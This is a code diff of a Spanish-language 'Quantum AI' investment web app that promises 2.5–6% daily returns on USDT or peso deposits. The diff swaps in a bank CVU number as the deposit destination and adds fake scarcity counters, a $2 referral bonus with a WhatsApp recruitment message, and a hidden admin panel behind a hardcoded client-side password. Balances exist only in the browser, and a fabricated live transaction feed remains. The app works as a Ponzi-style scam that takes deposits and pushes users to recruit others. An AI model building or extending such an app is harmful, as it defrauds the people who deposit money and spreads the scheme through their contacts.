@@ -15,15 +15,15 @@
 </head>
 <body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen pb-24">
 
-  <!-- ================= ACCESO Y REGISTRO INDIVIDUAL ================= -->
+  <!-- ACCESO Y REGISTRO INDIVIDUAL -->
   <div id="auth-screen" class="fixed inset-0 z-50 bg-slate-950 flex items-center justify-center p-4">
-    <div class="w-full max-w-sm bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl space-y-5">
+    <div class="w-full max-w-sm bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl space-y-4">
       <div class="text-center space-y-1">
         <div class="inline-flex items-center justify-center w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-400 text-2xl mb-1">
           <i class="fa-solid fa-shield-halved"></i>
         </div>
         <h2 class="text-lg font-bold text-white tracking-wide">Acceso Seguro Quantum AI</h2>
-        <p class="text-xs text-slate-400">Inicia sesión con tu móvil o regístrate si eres nuevo.</p>
+        <p class="text-xs text-slate-400">Inicia sesión o regístrate con tu número móvil.</p>
       </div>
 
       <form id="auth-form" class="space-y-3">
@@ -43,20 +43,28 @@
           </div>
         </div>
 
-        <button type="submit" id="btn-submit-auth" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs rounded-xl transition shadow-lg mt-2">
+        <div>
+          <label class="text-[11px] text-slate-400 block mb-1">Código de Invitación <span class="text-slate-500">(Opcional)</span></label>
+          <div class="flex items-center bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 focus-within:border-emerald-400 transition">
+            <i class="fa-solid fa-ticket text-slate-500 text-xs mr-2"></i>
+            <input id="auth-ref" type="text" placeholder="TRX-12345" class="bg-transparent text-xs text-emerald-400 font-mono w-full outline-none uppercase">
+          </div>
+        </div>
+
+        <button type="submit" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs rounded-xl transition shadow-lg mt-2">
           Ingresar / Crear Cuenta
         </button>
       </form>
     </div>
   </div>
 
-  <!-- ================= APLICACIÓN PRINCIPAL ================= -->
+  <!-- APLICACIÓN PRINCIPAL -->
   <main class="max-w-md mx-auto min-h-screen bg-slate-900 border-x border-slate-800 flex flex-col justify-between relative shadow-2xl">
     
     <div>
-      <!-- Header -->
+      <!-- Header con disparador oculto de Admin (3 toques rápidos) -->
       <header class="p-4 flex items-center justify-between border-b border-slate-800 bg-slate-950/40">
-        <div class="flex items-center gap-2">
+        <div id="admin-logo-trigger" class="flex items-center gap-2 cursor-pointer select-none">
           <i class="fa-solid fa-bolt text-emerald-400 text-xl"></i>
           <div>
             <span class="font-bold tracking-wide text-white text-xs block">QUANTUM AI</span>
@@ -108,46 +116,40 @@
         </div>
       </section>
 
-      <!-- TEMPORIZADOR DE PLANES ACTIVOS (CUENTA REGRESIVA) -->
-      <section id="active-plan-section" class="p-4 mx-4 mt-3 rounded-2xl bg-emerald-950/30 border border-emerald-500/30 hidden">
+      <!-- SECCIÓN INVITAR Y GANAR ($2 USD) -->
+      <section class="mx-4 mt-3 p-3.5 rounded-2xl bg-gradient-to-r from-emerald-950/40 to-slate-900 border border-emerald-500/30">
         <div class="flex items-center justify-between mb-2">
           <div class="flex items-center gap-2">
-            <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-            <h2 id="active-plan-title" class="text-xs font-bold text-emerald-400 uppercase tracking-wide">Plan Activo: $30 USDT</h2>
+            <span class="p-1.5 rounded-lg bg-emerald-500/20 text-emerald-400 text-xs"><i class="fa-solid fa-gift"></i></span>
+            <h3 class="text-xs font-bold text-white uppercase tracking-wide">Invita y Gana +$2 USD</h3>
           </div>
-          <span id="active-plan-retorno" class="text-[11px] font-mono font-bold text-white">Obj: $51.00 USDT</span>
+          <span class="text-[10px] text-emerald-400 font-semibold bg-emerald-500/10 px-2 py-0.5 rounded-full">Bono Directo</span>
         </div>
-        <p class="text-[11px] text-slate-400 mb-2">Tiempo restante para liberación y rendimiento:</p>
-        <div class="grid grid-cols-3 gap-2 text-center mb-3">
-          <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-800">
-            <span id="timer-days" class="text-sm font-extrabold text-white font-mono block">00</span>
-            <span class="text-[9px] text-slate-400 uppercase">Días</span>
+        <p class="text-[11px] text-slate-400 leading-relaxed mb-2.5">
+          Gana <strong>$2 USDT</strong> por cada invitado que realice su primer depósito utilizando tu código.
+        </p>
+        <div class="flex items-center gap-2">
+          <div class="bg-slate-950 border border-slate-750 px-3 py-1.5 rounded-xl flex-1 text-center font-mono font-bold text-xs text-emerald-400 select-all" id="user-referral-code">
+            TRX-00000
           </div>
-          <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-800">
-            <span id="timer-hours" class="text-sm font-extrabold text-white font-mono block">00</span>
-            <span class="text-[9px] text-slate-400 uppercase">Horas</span>
-          </div>
-          <div class="bg-slate-900/80 p-2 rounded-lg border border-slate-800">
-            <span id="timer-mins" class="text-sm font-extrabold text-white font-mono block">00</span>
-            <span class="text-[9px] text-slate-400 uppercase">Minutos</span>
-          </div>
-        </div>
-        <!-- Barra de Progreso -->
-        <div class="w-full bg-slate-900 rounded-full h-1.5 overflow-hidden border border-slate-800">
-          <div id="active-plan-progress" class="bg-emerald-500 h-1.5 rounded-full transition-all duration-500" style="width: 15%"></div>
+          <button onclick="copiarCodigoReferido(this)" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">
+            Copiar
+          </button>
+          <button onclick="compartirWhatsapp()" class="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold rounded-xl transition flex items-center gap-1">
+            <i class="fa-brands fa-whatsapp"></i> Compartir
+          </button>
         </div>
       </section>
 
       <!-- HISTORIAL DE MOVIMIENTOS -->
       <section class="mx-4 mt-3 rounded-2xl bg-slate-800/40 border border-slate-750 p-3.5">
-        <div class="flex items-center justify-between mb-2.5">
+        <div class="flex items-center justify-between mb-2">
           <h2 class="text-xs font-bold uppercase tracking-wider text-slate-300 flex items-center gap-2">
             <i class="fa-solid fa-clock-rotate-left text-emerald-400"></i> Mis Movimientos
           </h2>
           <span class="text-[10px] text-slate-400 font-mono" id="movs-count">0 operaciones</span>
         </div>
         <div id="movs-list" class="space-y-2 max-h-40 overflow-y-auto pr-1">
-          <!-- Movimientos generados dinámicamente -->
           <p id="movs-empty" class="text-[11px] text-slate-500 text-center py-2">No registras movimientos aún.</p>
         </div>
       </section>
@@ -197,14 +199,19 @@
         </div>
       </section>
 
-      <!-- Lista de 11 Planes -->
+      <!-- Lista de 11 Planes con CUPOS ESMERALDA -->
       <section class="p-4">
-        <h2 class="text-xs font-bold uppercase tracking-wider text-slate-300 mb-3">Planes de Depósito</h2>
-        <div id="plans-container" class="space-y-2.5"></div>
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="text-xs font-bold uppercase tracking-wider text-slate-300">Planes de Inversión</h2>
+          <span class="text-[10px] text-emerald-400 font-medium flex items-center gap-1 bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/20">
+            <i class="fa-solid fa-circle-check"></i> Rondas Abiertas
+          </span>
+        </div>
+        <div id="plans-container" class="space-y-3"></div>
       </section>
     </div>
 
-    <!-- Navegación Inferior -->
+    <!-- Barra Inferior -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-md bg-slate-950/95 backdrop-blur border-t border-slate-800 grid grid-cols-3 py-2.5 text-center text-xs z-40">
       <button class="text-emerald-400 flex flex-col items-center gap-1">
         <i class="fa-solid fa-house"></i>
@@ -220,7 +227,7 @@
       </a>
     </nav>
 
-    <!-- Modal de Depósito -->
+    <!-- Modal Depósito con TU CVU REAL -->
     <div id="deposit-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden flex items-center justify-center p-4">
       <div class="bg-slate-900 border border-slate-750 w-full max-w-sm rounded-2xl p-5 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
         <div class="flex items-center justify-between">
@@ -230,10 +237,9 @@
           <button id="close-deposit-btn" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
         </div>
 
-        <!-- Selector Red / Lemon -->
         <div class="grid grid-cols-2 p-1 bg-slate-950 rounded-xl border border-slate-800 text-xs">
           <button id="tab-crypto" class="py-1.5 rounded-lg font-semibold bg-emerald-500 text-slate-950 transition">USDT (TRC20)</button>
-          <button id="tab-ars" class="py-1.5 rounded-lg font-semibold text-slate-400 hover:text-white transition">Pesos (Lemon)</button>
+          <button id="tab-ars" class="py-1.5 rounded-lg font-semibold text-slate-400 hover:text-white transition">Pesos (CVU)</button>
         </div>
 
         <div id="deposit-crypto-view" class="space-y-3">
@@ -251,15 +257,16 @@
 
         <div id="deposit-ars-view" class="space-y-3 hidden">
           <div class="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl space-y-1">
-            <span class="text-[11px] text-emerald-400 block font-medium">Transferencia Bancaria / Billetera Virtual:</span>
-            <p class="text-xs text-slate-200">Cotización: <strong>1 USDT = $1.600 ARS</strong></p>
+            <span class="text-[11px] text-emerald-400 block font-medium">Transferencia Bancaria / Billeteras Virtuales:</span>
+            <p class="text-xs text-slate-200">Cotización fijada: <strong>1 USDT = $1.600 ARS</strong></p>
           </div>
           <div>
-            <label class="text-[11px] text-slate-400 block mb-1">Alias Oficial Lemon Cash:</label>
+            <label class="text-[11px] text-slate-400 block mb-1">CVU Oficial para transferencias:</label>
             <div class="flex items-center bg-slate-950 border border-slate-800 rounded-xl p-2 gap-2">
-              <input id="lemon-alias" type="text" readonly value="carnuz.dicho.LEMON" class="bg-transparent text-xs font-bold text-emerald-400 w-full outline-none select-all font-mono">
-              <button onclick="copiarTexto('lemon-alias', this)" class="px-3 py-1 bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold rounded-lg transition shrink-0">Copiar</button>
+              <input id="cvu-number" type="text" readonly value="0000085700274203412674" class="bg-transparent text-xs font-bold text-emerald-400 w-full outline-none select-all font-mono">
+              <button onclick="copiarTexto('cvu-number', this)" class="px-3 py-1 bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold rounded-lg transition shrink-0">Copiar</button>
             </div>
+            <p class="text-[10px] text-slate-400 mt-1">Titular verificado para acreditación directa.</p>
           </div>
         </div>
 
@@ -282,9 +289,44 @@
           <button id="close-withdraw-btn" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
         </div>
         <div class="space-y-3">
-          <input id="withdraw-address" type="text" placeholder="Billetera USDT TRC20 o Alias" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white outline-none focus:border-sky-400 font-mono">
+          <input id="withdraw-address" type="text" placeholder="Billetera USDT TRC20 o CVU" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white outline-none focus:border-sky-400 font-mono">
           <input id="withdraw-amount" type="number" min="10" placeholder="Monto USDT (Mínimo $10)" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white outline-none focus:border-sky-400 font-mono">
           <button id="btn-confirm-withdraw" class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-slate-950 font-bold text-xs rounded-xl transition">Confirmar Retiro</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- MODAL PANEL DE ADMINISTRADOR CON CLAVE 1619 -->
+    <div id="admin-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm hidden flex items-center justify-center p-4">
+      <div class="bg-slate-900 border border-emerald-500/40 w-full max-w-sm rounded-2xl p-5 shadow-2xl space-y-4">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+          <h3 class="text-xs font-bold text-emerald-400 flex items-center gap-2">
+            <i class="fa-solid fa-user-shield"></i> Panel de Administración
+          </h3>
+          <button onclick="document.getElementById('admin-modal').classList.add('hidden')" class="text-slate-400 hover:text-white">
+            <i class="fa-solid fa-xmark text-lg"></i>
+          </button>
+        </div>
+
+        <div class="space-y-3">
+          <div>
+            <label class="text-[11px] text-slate-400 block mb-1">Usuario Activo en Pantalla:</label>
+            <p id="admin-user-info" class="text-xs font-mono text-white bg-slate-950 p-2 rounded-lg border border-slate-800">Cargando...</p>
+          </div>
+
+          <div>
+            <label class="text-[11px] text-slate-400 block mb-1">Monto de Depósito a Acreditar (USDT):</label>
+            <input id="admin-credit-amount" type="number" placeholder="Ej: 30" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white font-mono outline-none focus:border-emerald-400">
+          </div>
+
+          <div class="p-2.5 bg-slate-950/60 rounded-xl border border-slate-800 space-y-1 text-[11px] text-slate-300">
+            <p>• Acredita balance directo al usuario.</p>
+            <p>• Si tiene código y es su primer depósito, le suma <strong>+$2 USD</strong> al que invitó.</p>
+          </div>
+
+          <button id="btn-admin-credit" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs rounded-xl transition shadow">
+            Confirmar y Acreditar Saldo
+          </button>
         </div>
       </div>
     </div>
@@ -295,46 +337,58 @@
     const ARS_RATE = 1600;
 
     const PLANS = [
-      { usd: 10, days: 15, rate: 0.025, name: "Plan Starter 10" },
-      { usd: 25, days: 20, rate: 0.028, name: "Plan Starter 25" },
-      { usd: 30, days: 20, rate: 0.030, name: "Plan Starter 30" },
-      { usd: 50, days: 25, rate: 0.032, name: "Plan Growth 50" },
-      { usd: 75, days: 25, rate: 0.035, name: "Plan Growth 75" },
-      { usd: 100, days: 30, rate: 0.040, name: "Plan Pro 100" },
-      { usd: 250, days: 30, rate: 0.042, name: "Plan Pro 250" },
-      { usd: 300, days: 30, rate: 0.045, name: "Plan Pro 300" },
-      { usd: 500, days: 45, rate: 0.050, name: "Plan Elite 500" },
-      { usd: 750, days: 45, rate: 0.055, name: "Plan Elite 750" },
-      { usd: 1000, days: 60, rate: 0.060, name: "Plan VIP 1000" }
+      { usd: 10, days: 15, rate: 0.025, name: "Plan Starter 10", quedan: 30, de: 50 },
+      { usd: 25, days: 20, rate: 0.028, name: "Plan Starter 25", quedan: 24, de: 40 },
+      { usd: 30, days: 20, rate: 0.030, name: "Plan Starter 30", quedan: 19, de: 35 },
+      { usd: 50, days: 25, rate: 0.032, name: "Plan Growth 50", quedan: 12, de: 30 },
+      { usd: 75, days: 25, rate: 0.035, name: "Plan Growth 75", quedan: 9, de: 25 },
+      { usd: 100, days: 30, rate: 0.040, name: "Plan Pro 100", quedan: 7, de: 20 },
+      { usd: 250, days: 30, rate: 0.042, name: "Plan Pro 250", quedan: 5, de: 15 },
+      { usd: 300, days: 30, rate: 0.045, name: "Plan Pro 300", quedan: 4, de: 12 },
+      { usd: 500, days: 45, rate: 0.050, name: "Plan Elite 500", quedan: 3, de: 10 },
+      { usd: 750, days: 45, rate: 0.055, name: "Plan Elite 750", quedan: 2, de: 8 },
+      { usd: 1000, days: 60, rate: 0.060, name: "Plan VIP 1000", quedan: 1, de: 5 }
     ];
 
     function formatNumber(n) {
       return new Intl.NumberFormat('es-AR').format(Math.round(n));
     }
 
-    // Renderizar Planes
     const plansContainer = document.getElementById('plans-container');
     plansContainer.innerHTML = PLANS.map(p => {
       const ars = p.usd * ARS_RATE;
       const pctTotal = (p.rate * p.days * 100).toFixed(0);
+      const porcentajeConsumido = Math.round(((p.de - p.quedan) / p.de) * 100);
+      
       return `
-        <div class="p-3.5 rounded-xl bg-slate-800/70 border border-slate-700/80 flex items-center justify-between">
-          <div>
-            <div class="flex items-center gap-2">
-              <span class="font-bold text-white text-xs">${p.name}</span>
-              <span class="text-[9px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded font-semibold">${p.days} Días</span>
+        <div class="p-3.5 rounded-2xl bg-slate-800/70 border border-slate-700/80 space-y-2.5">
+          <div class="flex items-center justify-between">
+            <div>
+              <div class="flex items-center gap-2">
+                <span class="font-bold text-white text-xs">${p.name}</span>
+                <span class="text-[9px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded font-semibold">${p.days} Días</span>
+              </div>
+              <p class="text-[11px] text-emerald-400 mt-0.5">${(p.rate * 100).toFixed(1)}% diario • <span class="text-slate-400">+${pctTotal}% Total</span></p>
+              <p class="text-xs font-mono font-bold text-white mt-1">$${p.usd} USDT <span class="text-[11px] text-slate-400 font-normal">(≈ $${formatNumber(ars)} ARS)</span></p>
             </div>
-            <p class="text-[11px] text-emerald-400 mt-0.5">${(p.rate * 100).toFixed(1)}% diario • <span class="text-slate-400">+${pctTotal}% Total</span></p>
-            <p class="text-xs font-mono font-bold text-white mt-1">$${p.usd} USDT <span class="text-[11px] text-slate-400 font-normal">(≈ $${formatNumber(ars)} ARS)</span></p>
+            <button onclick="seleccionarPlan(${p.usd})" class="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold rounded-lg transition shadow">
+              Depositar
+            </button>
           </div>
-          <button onclick="seleccionarPlan(${p.usd})" class="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold rounded-lg transition shadow">
-            Depositar
-          </button>
+
+          <div class="pt-2 border-t border-slate-800/80">
+            <div class="flex justify-between items-center text-[10px] mb-1">
+              <span class="text-emerald-400 font-semibold font-mono">Quedan ${p.quedan} de ${p.de} cupos</span>
+              <span class="text-slate-400 font-mono">${porcentajeConsumido}% asignado</span>
+            </div>
+            <div class="w-full bg-slate-950 rounded-full h-1.5 overflow-hidden border border-slate-800">
+              <div class="bg-emerald-400 h-1.5 rounded-full shadow-[0_0_8px_rgba(52,211,153,0.5)]" style="width: ${porcentajeConsumido}%"></div>
+            </div>
+          </div>
         </div>
       `;
     }).join('');
 
-    // Usuarios y Persistencia
     let currentUser = null;
 
     function getUsersDB() {
@@ -362,6 +416,7 @@
     function mostrarPanel() {
       document.getElementById('auth-screen').classList.add('hidden');
       document.getElementById('user-display-id').innerText = `ID: #${currentUser.id}`;
+      document.getElementById('user-referral-code').innerText = currentUser.id;
       document.getElementById('user-balance-usd').innerHTML = `$${currentUser.balance.toFixed(2)} <span class="text-sm font-normal text-slate-400">USDT</span>`;
       document.getElementById('user-balance-ars').innerText = `≈ $${formatNumber(currentUser.balance * ARS_RATE)} ARS`;
       
@@ -374,14 +429,11 @@
       }
 
       renderizarMovimientos();
-      iniciarTemporizador();
     }
 
-    // Renderizar Historial de Movimientos
     function renderizarMovimientos() {
       const movsList = document.getElementById('movs-list');
       const movsCount = document.getElementById('movs-count');
-      const emptyMsg = document.getElementById('movs-empty');
 
       if (!currentUser.movimientos || currentUser.movimientos.length === 0) {
         movsList.innerHTML = '<p class="text-[11px] text-slate-500 text-center py-2">No registras movimientos aún.</p>';
@@ -391,13 +443,12 @@
 
       movsCount.innerText = `${currentUser.movimientos.length} operaciones`;
       movsList.innerHTML = currentUser.movimientos.slice().reverse().map(m => {
-        const isDep = m.tipo === 'Depósito';
-        const color = isDep ? (m.estado === 'Aprobado' ? 'text-emerald-400' : 'text-amber-400') : 'text-sky-400';
+        const isBonus = m.tipo.includes('Bono');
         const badgeBg = m.estado === 'Aprobado' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' : 'bg-amber-500/10 border-amber-500/20 text-amber-300';
         return `
           <div class="p-2 rounded-xl bg-slate-950/70 border border-slate-800 flex items-center justify-between text-xs">
             <div>
-              <span class="font-bold text-white block text-[11px]">${m.tipo} ${m.monto} USDT</span>
+              <span class="font-bold ${isBonus ? 'text-emerald-400' : 'text-white'} block text-[11px]">${m.tipo} $${m.monto} USDT</span>
               <span class="text-[9px] text-slate-400">${m.fecha} • ${m.ref}</span>
             </div>
             <span class="text-[10px] px-2 py-0.5 rounded-full border ${badgeBg}">${m.estado}</span>
@@ -406,57 +457,12 @@
       }).join('');
     }
 
-    // Temporizador de Cuenta Regresiva
-    let timerInterval = null;
-    function iniciarTemporizador() {
-      const sec = document.getElementById('active-plan-section');
-      if (!currentUser.activePlan) {
-        sec.classList.add('hidden');
-        return;
-      }
-
-      sec.classList.remove('hidden');
-      document.getElementById('active-plan-title').innerText = `Plan Activo: $${currentUser.activePlan.amount} USDT`;
-      document.getElementById('active-plan-retorno').innerText = `Obj: $${currentUser.activePlan.targetUsd.toFixed(2)} USDT`;
-
-      if (timerInterval) clearInterval(timerInterval);
-
-      function updateTimer() {
-        const now = new Date().getTime();
-        const diff = currentUser.activePlan.endTime - now;
-
-        if (diff <= 0) {
-          clearInterval(timerInterval);
-          document.getElementById('timer-days').innerText = "00";
-          document.getElementById('timer-hours').innerText = "00";
-          document.getElementById('timer-mins').innerText = "00";
-          document.getElementById('active-plan-progress').style.width = '100%';
-          return;
-        }
-
-        const d = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-
-        document.getElementById('timer-days').innerText = String(d).padStart(2, '0');
-        document.getElementById('timer-hours').innerText = String(h).padStart(2, '0');
-        document.getElementById('timer-mins').innerText = String(m).padStart(2, '0');
-
-        const totalDuration = currentUser.activePlan.endTime - currentUser.activePlan.startTime;
-        const elapsed = now - currentUser.activePlan.startTime;
-        const pct = Math.min(100, Math.max(0, (elapsed / totalDuration) * 100));
-        document.getElementById('active-plan-progress').style.width = `${pct}%`;
-      }
-
-      updateTimer();
-      timerInterval = setInterval(updateTimer, 60000);
-    }
-
-    // Login y Registro
+    // Registro y Login
     document.getElementById('auth-form').addEventListener('submit', (e) => {
       e.preventDefault();
       const phone = document.getElementById('auth-phone').value.trim();
       const pin = document.getElementById('auth-pin').value.trim();
+      const refCode = document.getElementById('auth-ref').value.trim().toUpperCase();
 
       const db = getUsersDB();
       if (!db[phone]) {
@@ -466,8 +472,9 @@
           id: 'TRX-' + Math.floor(10000 + Math.random() * 90000),
           balance: 0.0,
           pendingDeposit: 0.0,
-          movimientos: [],
-          activePlan: null
+          invitedBy: refCode || null,
+          firstDepositDone: false,
+          movimientos: []
         };
       } else {
         if (db[phone].pin !== pin) {
@@ -488,7 +495,21 @@
       }
     });
 
-    // Calculadora interactiva
+    window.copiarCodigoReferido = function(btn) {
+      if (!currentUser) return;
+      navigator.clipboard.writeText(currentUser.id);
+      const prev = btn.innerText;
+      btn.innerText = '¡Copiado!';
+      setTimeout(() => btn.innerText = prev, 1500);
+    };
+
+    window.compartirWhatsapp = function() {
+      if (!currentUser) return;
+      const url = window.location.href;
+      const msg = encodeURIComponent(`¡Únete a Quantum AI! Regístrate con mi código ${currentUser.id} para asegurar tus rendimientos diarios: ${url}`);
+      window.open(`https://wa.me/?text=${msg}`, '_blank');
+    };
+
     const calcSelect = document.getElementById('calc-plan-select');
     function updateCalc() {
       const opt = calcSelect.selectedOptions[0];
@@ -518,7 +539,6 @@
       document.getElementById('deposit-modal').classList.remove('hidden');
     };
 
-    // Tabs modal depósito
     const tabCrypto = document.getElementById('tab-crypto');
     const tabArs = document.getElementById('tab-ars');
     const cryptoView = document.getElementById('deposit-crypto-view');
@@ -596,7 +616,7 @@
       const addr = document.getElementById('withdraw-address').value.trim();
 
       if (!addr || isNaN(amt) || amt < 10) {
-        alert('Ingresa una dirección válida y un monto mínimo de $10 USD.');
+        alert('Ingresa una dirección/CVU válida y un monto mínimo de $10 USD.');
         return;
       }
 
@@ -623,52 +643,72 @@
       alert(`Solicitud de retiro por $${amt} USDT en proceso.`);
     });
 
-    // PANEL DE ADMINISTRADOR VÍA CONSOLA
-    window.aprobarRecarga = function(monto) {
-      if (!currentUser) return console.log("No hay usuario activo.");
+    // PANEL DE ADMINISTRADOR OCULTO CON CLAVE 1619
+    let logoClicks = 0;
+    let logoTimer = null;
+    document.getElementById('admin-logo-trigger').addEventListener('click', () => {
+      logoClicks++;
+      clearTimeout(logoTimer);
+      logoTimer = setTimeout(() => logoClicks = 0, 1000);
+
+      if (logoClicks >= 3) {
+        logoClicks = 0;
+        const pass = prompt('Clave Maestra de Administrador:');
+        if (pass === '1619') {
+          if (!currentUser) {
+            alert('No hay usuario activo en sesión.');
+            return;
+          }
+          document.getElementById('admin-user-info').innerText = `ID: #${currentUser.id} | Tel: ${currentUser.phone} | Saldo: $${currentUser.balance}`;
+          document.getElementById('admin-credit-amount').value = currentUser.pendingDeposit || '';
+          document.getElementById('admin-modal').classList.remove('hidden');
+        } else if (pass !== null) {
+          alert('Clave incorrecta.');
+        }
+      }
+    });
+
+    // Acreditación de Saldo y Bono de $2 USD al Invitador
+    document.getElementById('btn-admin-credit').addEventListener('click', () => {
+      const monto = parseFloat(document.getElementById('admin-credit-amount').value);
+      if (!monto || monto <= 0) {
+        alert('Ingresa un monto válido.');
+        return;
+      }
+
+      const db = getUsersDB();
       currentUser.balance += monto;
-      currentUser.pendingDeposit = Math.max(0, currentUser.pendingDeposit - monto);
-      
+      currentUser.pendingDeposit = Math.max(0, (currentUser.pendingDeposit || 0) - monto);
+
       currentUser.movimientos.forEach(m => {
         if (m.tipo === 'Depósito' && m.estado === 'En revisión') m.estado = 'Aprobado';
       });
 
-      const db = getUsersDB();
+      if (currentUser.invitedBy && !currentUser.firstDepositDone) {
+        currentUser.firstDepositDone = true;
+        const hostPhone = Object.keys(db).find(k => db[k].id === currentUser.invitedBy);
+        if (hostPhone) {
+          db[hostPhone].balance += 2.0;
+          if (!db[hostPhone].movimientos) db[hostPhone].movimientos = [];
+          db[hostPhone].movimientos.push({
+            tipo: 'Bono Referido',
+            monto: 2.0,
+            fecha: new Date().toLocaleDateString('es-AR'),
+            ref: `Invitado #${currentUser.id}`,
+            estado: 'Aprobado'
+          });
+          alert(`¡Depósito aprobado! Se sumaron +$2 USD a la cuenta de ${db[hostPhone].id} por invitarlo.`);
+        }
+      } else {
+        alert(`¡Depósito de $${monto} USD aprobado con éxito!`);
+      }
+
       db[currentUser.phone] = currentUser;
       saveUsersDB(db);
+
       mostrarPanel();
-      console.log(`¡Recarga de $${monto} USD aprobada con éxito!`);
-    };
-
-    window.activarPlan = function(monto, dias, tasa) {
-      if (!currentUser) return console.log("No hay usuario activo.");
-      const startTime = new Date().getTime();
-      const endTime = startTime + (dias * 24 * 60 * 60 * 1000);
-      const targetUsd = monto + (monto * tasa * dias);
-
-      currentUser.activePlan = {
-        amount: monto,
-        days: dias,
-        rate: tasa,
-        startTime: startTime,
-        endTime: endTime,
-        targetUsd: targetUsd
-      };
-
-      currentUser.movimientos.push({
-        tipo: 'Plan Activado',
-        monto: monto,
-        fecha: new Date().toLocaleDateString('es-AR'),
-        ref: `${dias} Días (${(tasa*100).toFixed(1)}%/d)`,
-        estado: 'Aprobado'
-      });
-
-      const db = getUsersDB();
-      db[currentUser.phone] = currentUser;
-      saveUsersDB(db);
-      mostrarPanel();
-      console.log(`Plan de $${monto} USD por ${dias} días activado.`);
-    };
+      document.getElementById('admin-modal').classList.add('hidden');
+    });
 
     // Feed de transacciones en vivo
     const sampleAddrs = ['0x1A...8F', '0x7C...3E', '0x99...2A', '0x3D...1B', '0x88...6C'];
@@ -684,4 +724,3 @@
   </script>
 </body>
 </html>
-
